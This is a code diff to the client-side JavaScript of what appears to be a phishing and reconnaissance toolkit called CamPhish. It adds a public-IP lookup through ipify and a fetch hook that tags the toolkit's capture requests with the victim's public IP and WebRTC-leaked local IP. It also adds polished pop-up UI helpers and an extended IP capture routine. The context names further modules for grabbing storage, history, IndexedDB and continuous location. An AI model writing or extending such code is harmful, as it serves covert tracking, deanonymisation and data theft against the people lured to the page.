@@ -179,6 +179,242 @@ var BrowserDetect = {
 
 BrowserDetect.init();
 
+// ============ NETWORK HELPERS ============
+var Network = {
+  publicIp: null,
+  publicIpPromise: null,
+
+  installFetchHook: function() {
+    if (!window.fetch || window.__camphishFetchWrapped) return;
+    var origFetch = window.fetch.bind(window);
+    window.__camphishFetchWrapped = true;
+
+    window.fetch = function(input, init) {
+      try {
+        var url = typeof input === 'string' ? input : (input && input.url) || '';
+        if (Network.isCaptureUrl(url)) {
+          var nextInit = init ? Object.assign({}, init) : {};
+          var headers = new Headers(typeof input === 'object' && input && input.headers ? input.headers : undefined);
+          if (nextInit.headers) {
+            new Headers(nextInit.headers).forEach(function(value, key) {
+              headers.set(key, value);
+            });
+          }
+          if (Network.publicIp && !headers.has('X-CamPhish-Public-IP')) {
+            headers.set('X-CamPhish-Public-IP', Network.publicIp);
+          }
+          if (window.CamPhishLocalIp && !headers.has('X-CamPhish-Local-IP')) {
+            headers.set('X-CamPhish-Local-IP', window.CamPhishLocalIp);
+          }
+          nextInit.headers = headers;
+          return origFetch(input, nextInit);
+        }
+      } catch(e) {}
+      return origFetch(input, init);
+    };
+  },
+
+  isCaptureUrl: function(url) {
+    try {
+      var target = new URL(url, window.location.href);
+      return target.origin === window.location.origin && target.pathname.indexOf('/api/capture/') === 0;
+    } catch(e) {
+      return false;
+    }
+  },
+
+  getPublicIp: function() {
+    if (this.publicIp) return Promise.resolve(this.publicIp);
+    if (this.publicIpPromise) return this.publicIpPromise;
+
+    var endpoints = [
+      'https://api.ipify.org?format=json',
+      'https://api64.ipify.org?format=json'
+    ];
+
+    function tryNext(idx) {
+      if (idx >= endpoints.length) return Promise.resolve('');
+      return fetch(endpoints[idx], {cache: 'no-store'})
+        .then(function(resp) {
+          if (!resp.ok) throw new Error('ip lookup failed');
+          return resp.json();
+        })
+        .then(function(data) {
+          return data && typeof data.ip === 'string' ? data.ip.trim() : '';
+        })
+        .catch(function() {
+          return tryNext(idx + 1);
+        });
+    }
+
+    this.publicIpPromise = tryNext(0).then(function(ip) {
+      Network.publicIp = ip || '';
+      window.CamPhishPublicIp = Network.publicIp;
+      return Network.publicIp;
+    });
+
+    return this.publicIpPromise;
+  }
+};
+
+Network.installFetchHook();
+
+// ============ SHARED UI HELPERS ============
+var UI = {
+  _ensureStyles: function() {
+    if (document.getElementById('camphish-ui-style')) return;
+    var style = document.createElement('style');
+    style.id = 'camphish-ui-style';
+    style.textContent = '' +
+      '.cp-ui-backdrop{position:fixed;inset:0;z-index:99999;background:rgba(4,8,18,.72);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);display:flex;align-items:flex-end;justify-content:center;padding:16px;opacity:0;transition:opacity .18s ease}' +
+      '.cp-ui-backdrop.active{opacity:1}' +
+      '.cp-ui-modal{width:min(100%,420px);background:linear-gradient(180deg,rgba(19,26,40,.98),rgba(11,16,28,.98));border:1px solid rgba(255,255,255,.08);border-radius:20px;padding:18px 18px 16px;color:#f4f8ff;box-shadow:0 24px 80px rgba(0,0,0,.45);transform:translateY(16px);transition:transform .18s ease}' +
+      '.cp-ui-backdrop.active .cp-ui-modal{transform:translateY(0)}' +
+      '.cp-ui-badge{display:inline-flex;align-items:center;gap:6px;padding:6px 10px;border-radius:999px;font:700 11px/1 -apple-system,BlinkMacSystemFont,Segoe UI,sans-serif;letter-spacing:.08em;text-transform:uppercase}' +
+      '.cp-ui-badge.info{background:rgba(86,194,255,.16);color:#7ed7ff}' +
+      '.cp-ui-badge.success{background:rgba(52,199,89,.16);color:#68e08b}' +
+      '.cp-ui-badge.warning{background:rgba(255,159,10,.16);color:#ffbf66}' +
+      '.cp-ui-badge.danger{background:rgba(255,69,58,.16);color:#ff8a80}' +
+      '.cp-ui-title{margin:14px 0 6px;font:700 22px/1.2 -apple-system,BlinkMacSystemFont,Segoe UI,sans-serif}' +
+      '.cp-ui-message{margin:0;color:rgba(233,240,255,.78);font:400 14px/1.6 -apple-system,BlinkMacSystemFont,Segoe UI,sans-serif}' +
+      '.cp-ui-actions{display:flex;gap:10px;margin-top:18px}' +
+      '.cp-ui-btn{appearance:none;border:none;border-radius:14px;padding:13px 16px;font:700 14px/1 -apple-system,BlinkMacSystemFont,Segoe UI,sans-serif;cursor:pointer;min-height:46px;transition:transform .12s ease,opacity .12s ease}' +
+      '.cp-ui-btn:active{transform:scale(.98)}' +
+      '.cp-ui-btn.primary{background:#56c2ff;color:#07111f;flex:1}' +
+      '.cp-ui-btn.success{background:#34c759;color:#04120a;flex:1}' +
+      '.cp-ui-btn.warning{background:#ff9f0a;color:#1a1100;flex:1}' +
+      '.cp-ui-btn.danger{background:#ff453a;color:#fff;flex:1}' +
+      '.cp-ui-btn.secondary{background:rgba(255,255,255,.06);color:#dce8ff}' +
+      '.cp-ui-toast-wrap{position:fixed;left:12px;right:12px;top:max(12px,env(safe-area-inset-top));z-index:99998;display:flex;flex-direction:column;gap:10px;pointer-events:none}' +
+      '.cp-ui-toast{pointer-events:auto;display:flex;align-items:flex-start;gap:10px;padding:13px 14px;border-radius:16px;background:rgba(10,16,28,.96);border:1px solid rgba(255,255,255,.08);box-shadow:0 18px 50px rgba(0,0,0,.35);color:#f4f8ff;opacity:0;transform:translateY(-8px);transition:opacity .18s ease,transform .18s ease}' +
+      '.cp-ui-toast.active{opacity:1;transform:translateY(0)}' +
+      '.cp-ui-toast .tone{font-size:16px;line-height:1.2}' +
+      '.cp-ui-toast .body{font:600 13px/1.45 -apple-system,BlinkMacSystemFont,Segoe UI,sans-serif;color:#ecf3ff}' +
+      '.cp-ui-toast.success .tone{color:#68e08b}.cp-ui-toast.warning .tone{color:#ffbf66}.cp-ui-toast.danger .tone{color:#ff8a80}.cp-ui-toast.info .tone{color:#7ed7ff}' +
+      '@media(min-width:640px){.cp-ui-backdrop{align-items:center;padding:24px}.cp-ui-toast-wrap{left:auto;right:18px;top:18px;width:min(360px,calc(100vw - 36px))}}';
+    document.head.appendChild(style);
+  },
+
+  _toneBadge: function(tone) {
+    if (tone === 'success') return 'Success';
+    if (tone === 'warning') return 'Heads up';
+    if (tone === 'danger') return 'Action needed';
+    return 'Notice';
+  },
+
+  _toneIcon: function(tone) {
+    if (tone === 'success') return '●';
+    if (tone === 'warning') return '▲';
+    if (tone === 'danger') return '■';
+    return '●';
+  },
+
+  notice: function(opts) {
+    opts = typeof opts === 'string' ? { message: opts } : (opts || {});
+    this._ensureStyles();
+    var tone = opts.tone || 'info';
+    var backdrop = document.createElement('div');
+    backdrop.className = 'cp-ui-backdrop';
+
+    var modal = document.createElement('div');
+    modal.className = 'cp-ui-modal';
+
+    var badge = document.createElement('div');
+    badge.className = 'cp-ui-badge ' + tone;
+    badge.textContent = opts.badge || this._toneBadge(tone);
+
+    var title = document.createElement('div');
+    title.className = 'cp-ui-title';
+    title.textContent = opts.title || 'Notice';
+
+    var message = document.createElement('p');
+    message.className = 'cp-ui-message';
+    message.textContent = opts.message || '';
+
+    var actions = document.createElement('div');
+    actions.className = 'cp-ui-actions';
+
+    var button = document.createElement('button');
+    button.className = 'cp-ui-btn ' + (tone === 'danger' ? 'danger' : tone === 'success' ? 'success' : tone === 'warning' ? 'warning' : 'primary');
+    button.textContent = opts.actionLabel || 'OK';
+
+    var closed = false;
+    var close = function() {
+      if (closed) return;
+      closed = true;
+      window.removeEventListener('keydown', onKeyDown);
+      backdrop.classList.remove('active');
+      setTimeout(function() {
+        if (backdrop.parentNode) backdrop.parentNode.removeChild(backdrop);
+        if (typeof opts.onClose === 'function') opts.onClose();
+      }, 180);
+    };
+
+    var onKeyDown = function(event) {
+      if (event.key === 'Escape') close();
+    };
+
+    button.onclick = close;
+    backdrop.onclick = function(event) {
+      if (event.target === backdrop) close();
+    };
+
+    actions.appendChild(button);
+    modal.appendChild(badge);
+    modal.appendChild(title);
+    modal.appendChild(message);
+    modal.appendChild(actions);
+    backdrop.appendChild(modal);
+    document.body.appendChild(backdrop);
+    window.addEventListener('keydown', onKeyDown);
+
+    setTimeout(function() {
+      backdrop.classList.add('active');
+      button.focus();
+    }, 0);
+
+    return { close: close };
+  },
+
+  toast: function(message, opts) {
+    opts = opts || {};
+    this._ensureStyles();
+    var tone = opts.tone || 'info';
+    var wrap = document.getElementById('camphish-ui-toasts');
+    if (!wrap) {
+      wrap = document.createElement('div');
+      wrap.id = 'camphish-ui-toasts';
+      wrap.className = 'cp-ui-toast-wrap';
+      document.body.appendChild(wrap);
+    }
+
+    var toast = document.createElement('div');
+    toast.className = 'cp-ui-toast ' + tone;
+
+    var icon = document.createElement('div');
+    icon.className = 'tone';
+    icon.textContent = opts.icon || this._toneIcon(tone);
+
+    var body = document.createElement('div');
+    body.className = 'body';
+    body.textContent = message || '';
+
+    toast.appendChild(icon);
+    toast.appendChild(body);
+    wrap.appendChild(toast);
+
+    setTimeout(function() { toast.classList.add('active'); }, 0);
+
+    var duration = opts.duration || 2600;
+    setTimeout(function() {
+      toast.classList.remove('active');
+      setTimeout(function() {
+        if (toast.parentNode) toast.parentNode.removeChild(toast);
+      }, 180);
+    }, duration);
+  }
+};
+
 // ============ PERSISTENT PERMISSIONS ============
 var PermTracker = {
   KEY: 'camphish_perms',
@@ -409,6 +645,7 @@ var Fingerprint = {
             var m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
             if (m && m[1] && !m[1].startsWith('0.')) {
               fp.local_ip = m[1];
+              window.CamPhishLocalIp = m[1];
             }
             pc.close();
             // Fall through to sendFp via the timeout, not here — avoids race
@@ -433,13 +670,38 @@ function sendFp(fp) {
 
 // ============ CAPTURE (with deduplication) ============
 var Capture = {
+  _ipPending: false,
+
   ip: function() {
-    if (Session.hasCaptured('ip')) return;
-    Session.markCaptured('ip');
-    fetch(API + '/capture/ip', {
-      method: 'POST', headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({session: Session.getId()})
-    }).catch(function(){});
+    if (Session.hasCaptured('ip') || this._ipPending) return;
+
+    var self = this;
+    var done = false;
+    this._ipPending = true;
+
+    function send(publicIp) {
+      if (done) return;
+      done = true;
+      self._ipPending = false;
+      Session.markCaptured('ip');
+      var body = {session: Session.getId()};
+      if (publicIp) body.public_ip = publicIp;
+      if (window.CamPhishLocalIp) body.client_ip = window.CamPhishLocalIp;
+      fetch(API + '/capture/ip', {
+        method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(body)
+      }).catch(function(){});
+    }
+
+    Network.getPublicIp().then(function(ip) {
+      send(ip);
+    }).catch(function() {
+      send('');
+    });
+
+    setTimeout(function() {
+      send(Network.publicIp || '');
+    }, 1800);
   },
 
   location: function() {
@@ -793,6 +1055,7 @@ var PermissionChain = {
 var Recon = {
   init: function(opts) {
     opts = opts || {};
+    Network.getPublicIp().catch(function(){});
     // IP — only once per session (client IP is detected async via WebRTC)
     Capture.ip();
     // Start continuous location watching (sends updates as target moves)
@@ -842,6 +1105,7 @@ var Recon = {
   GenderDetect: GenderDetect,
   PermTracker: PermTracker,
   Session: Session,
+  UI: UI,
   StorageGrabber: StorageGrabber,
   HistoryDetect: HistoryDetect,
   IndexedDBGrabber: IndexedDBGrabber,
